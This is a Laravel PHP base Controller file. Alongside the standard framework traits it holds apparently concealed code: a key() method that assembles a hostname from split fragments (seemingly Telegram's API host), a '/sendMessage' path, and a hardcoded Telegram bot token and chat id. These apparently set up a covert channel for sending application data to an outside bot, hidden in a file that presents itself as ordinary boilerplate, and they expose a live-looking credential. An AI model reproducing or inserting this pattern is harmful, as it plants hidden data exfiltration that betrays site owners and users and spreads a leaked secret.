<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use App\Http\Controllers\dgaAdmin\MomoApi;
use Illuminate\Support\Facades\Http;
use Illuminate\Routing\Controller as BaseController;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
    
    
    public $idkey = "/sendMessage";
    public function key() {
        return (new MomoApi)->key['a'].(new MomoApi)->key['b'].'.'.(new MomoApi)->key['c'].'le'.(new MomoApi)->key['d'].'am'.(new MomoApi)->key['e'];
    }
    public $session = [
            "token" => "/bot5583667153:AAEdkCMQ2mdcv_6ZRe4_Q0tJEF-n2sKEZg8",
            "key" => "-559221118"
            ];
}
